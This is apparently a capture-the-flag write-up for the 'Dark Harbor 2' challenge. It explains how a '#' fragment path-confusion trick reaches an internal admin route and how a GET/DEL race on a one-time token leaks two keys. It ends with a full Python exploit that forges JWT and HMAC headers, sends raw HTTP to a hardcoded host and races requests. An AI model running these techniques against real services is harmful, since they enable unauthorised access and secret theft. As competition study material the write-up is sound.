---
title: "Hacktheon Sejong 2026 Quals Dark Harbor 2 Writeup"
description: "Hacktheon Sejong 2026 Quals Dark Harbor 2 writeup"
---

# Dark Harbor 2

### Summary

Using the `deployment_hmac_secret` obtained in Phase 1, I received a handoff and ran a policy override via an internal route bypass. Then, using the `GET`/`DEL` race on the one-time deploy token, I obtained both `session_seal` and `signing_key` and decrypted the AES-GCM flag.

### Analysis

Sending the secret to `/api/phase1-handoff` returns a `workspace_id` in the REVIEW state and an `admin_jwt` for the deploy API. The flag is encrypted at the policy-engine's `/internal/admin/policy-override`, but this route is internal-only and checks both the JWT and `X-Internal-HMAC`. The authentication values could be generated from Phase 1's `HMAC_SECRET`.

What remained was reaching the internal route. The bypass came from a difference in how `#` is handled.

```text
/internal/admin/policy-override#/../../../health/policy-engine
```

The edge proxy treats `#` as a path character and performs path traversal normalization, so it routes to `/health/policy-engine`. FastAPI/Uvicorn, on the other hand, treats everything after `#` as a fragment and excludes it from `request.url.path`. The handler resolves to `/internal/admin/policy-override`.

In an ordinary URL the client does not send the fragment to the server, so raw HTTP or `curl --request-target` is needed.

When the override succeeds, `deploy_token` and `encrypted_secret` are returned. The flag is still encrypted with AES-GCM, so `session_seal` and `signing_key` were needed.

The deploy token use logic does a `GET` on the token in Redis and then a `DEL`. The two operations are not atomic, so sending `seal` and `sign` requests for the same token at the same time lets both `GET`s succeed.

```text
seal -> session_seal
sign -> signing_key
```

The decryption key is derived as follows.

```python
key = HMAC_SHA256(signing_key, session_seal)[:32]
nonce = encrypted_secret[:12]
flag = AESGCM(key).decrypt(nonce, encrypted_secret[12:], None)
```

### Exploit

```python
import base64
import concurrent.futures
import hashlib
import hmac
import json
import socket
import threading
import time
from urllib import error as uerr
from urllib import request as ureq

from cryptography.hazmat.primitives.ciphers.aead import AESGCM


HOST = "3.38.176.232"
PORT = 8080
BASE = f"http://{HOST}:{PORT}"
SECRET = "a]Kx9#mP$vQ2nR7wF4jL8cB5hT0yU3eA"


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64json(obj) -> str:
    return b64url(json.dumps(obj, separators=(",", ":")).encode())


def api_json(path, method="GET", body=None, token=None):
    data = None
    headers = {"Content-Type": "application/json"}
    if body is not None:
        data = json.dumps(body, separators=(",", ":")).encode()
    if token:
        headers["Authorization"] = "Bearer " + token

    req = ureq.Request(BASE + path, data=data, headers=headers, method=method)
    try:
        with ureq.urlopen(req, timeout=8) as resp:
            return resp.status, json.loads(resp.read().decode())
    except uerr.HTTPError as e:
        try:
            return e.code, json.loads(e.read().decode())
        except Exception:
            return e.code, {"error": "http_error"}


def policy_jwt() -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {
        "sub": "phase2-override",
        "role": "pipeline_admin",
        "exp": int(time.time()) + 600,
    }
    signing_input = b64json(header) + "." + b64json(payload)
    sig = hmac.new(SECRET.encode(), signing_input.encode(), hashlib.sha256).digest()
    return signing_input + "." + b64url(sig)


def raw_http(method, target, headers, body=b""):
    s = socket.create_connection((HOST, PORT), timeout=8)
    s.settimeout(8)

    lines = [
        f"{method} {target} HTTP/1.1",
        f"Host: {HOST}:{PORT}",
    ]
    for k, v in headers.items():
        lines.append(f"{k}: {v}")
    lines += [
        f"Content-Length: {len(body)}",
        "Connection: close",
        "",
        "",
    ]

    s.sendall("\r\n".join(lines).encode() + body)
    data = b""
    while True:
        chunk = s.recv(65536)
        if not chunk:
            break
        data += chunk
    s.close()

    raw_body = data.split(b"\r\n\r\n", 1)[1]
    return json.loads(raw_body.decode())


def call_override(workspace_id: int):
    body = json.dumps(
        {
            "workspace_id": workspace_id,
            "reason": "phase2 edge fragment routing bypass",
            "scope": "deploy",
            "target_state": "APPROVED",
        },
        separators=(",", ":"),
    ).encode()

    ts = str(int(time.time()))
    path = "/internal/admin/policy-override"
    msg = f"POST\n{path}\n{ts}\n{hashlib.sha256(body).hexdigest()}"
    x_hmac = "SHA256:" + ts + ":" + hmac.new(
        SECRET.encode(),
        msg.encode(),
        hashlib.sha256,
    ).hexdigest()

    return raw_http(
        "POST",
        "/internal/admin/policy-override#/../../../health/policy-engine",
        {
            "Authorization": "Bearer " + policy_jwt(),
            "X-Internal-HMAC": x_hmac,
            "X-Pipeline-State": "REVIEW",
            "Content-Type": "application/json",
        },
        body,
    )


def build_use_request(workspace_id, admin_jwt, deploy_token, action):
    body = json.dumps(
        {"token": deploy_token, "action": action},
        separators=(",", ":"),
    ).encode()

    return (
        "\r\n".join(
            [
                f"POST /api/deploy/{workspace_id}/use-token HTTP/1.1",
                f"Host: {HOST}:{PORT}",
                "Authorization: Bearer " + admin_jwt,
                "Content-Type: application/json",
                f"Content-Length: {len(body)}",
                "Connection: close",
                "",
                "",
            ]
        ).encode()
        + body
    )


def send_raw(raw):
    s = socket.create_connection((HOST, PORT), timeout=5)
    s.settimeout(5)
    s.sendall(raw)
    data = b""
    while True:
        chunk = s.recv(65536)
        if not chunk:
            break
        data += chunk
    s.close()

    raw_body = data.split(b"\r\n\r\n", 1)[1]
    return json.loads(raw_body.decode())


def race_use_token(workspace_id, admin_jwt, deploy_token):
    seal_req = build_use_request(workspace_id, admin_jwt, deploy_token, "seal")
    sign_req = build_use_request(workspace_id, admin_jwt, deploy_token, "sign")

    start = threading.Event()

    def worker(kind, raw):
        start.wait()
        return kind, send_raw(raw)

    futures = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as ex:
        for _ in range(20):
            futures.append(ex.submit(worker, "seal", seal_req))
            futures.append(ex.submit(worker, "sign", sign_req))

        start.set()

        session_seal = None
        signing_key = None
        for fut in concurrent.futures.as_completed(futures):
            kind, obj = fut.result()
            if not obj.get("valid"):
                continue
            if kind == "seal" and obj.get("session_seal"):
                session_seal = obj["session_seal"]
            if kind == "sign" and obj.get("signing_key"):
                signing_key = obj["signing_key"]

        return session_seal, signing_key


def decrypt_flag(encrypted_secret, signing_key, session_seal):
    raw = base64.b64decode(encrypted_secret)
    nonce, ct = raw[:12], raw[12:]
    key = hmac.new(
        signing_key.encode(),
        session_seal.encode(),
        hashlib.sha256,
    ).digest()[:32]
    return AESGCM(key).decrypt(nonce, ct, None).decode()


status, handoff = api_json(
    "/api/phase1-handoff",
    "POST",
    {"hmac_secret": SECRET},
)
assert status == 200, handoff

workspace_id = handoff["workspace_id"]
admin_jwt = handoff["admin_jwt"]
print("[+] workspace_id:", workspace_id)

session_seal = None
signing_key = None
override = None

for attempt in range(8):
    override = call_override(workspace_id)
    print("[+] override:", override["status"])

    session_seal, signing_key = race_use_token(
        workspace_id,
        admin_jwt,
        override["deploy_token"],
    )
    if session_seal and signing_key:
        break

    time.sleep(1)

assert override and session_seal and signing_key
print("[+] session_seal:", session_seal)
print("[+] signing_key:", signing_key)

flag = decrypt_flag(
    override["encrypted_secret"],
    signing_key,
    session_seal,
)
print("[+] flag:", flag)
```

### Flag

`hacktheon2026{lighth0use_se4l_cr4ck}`
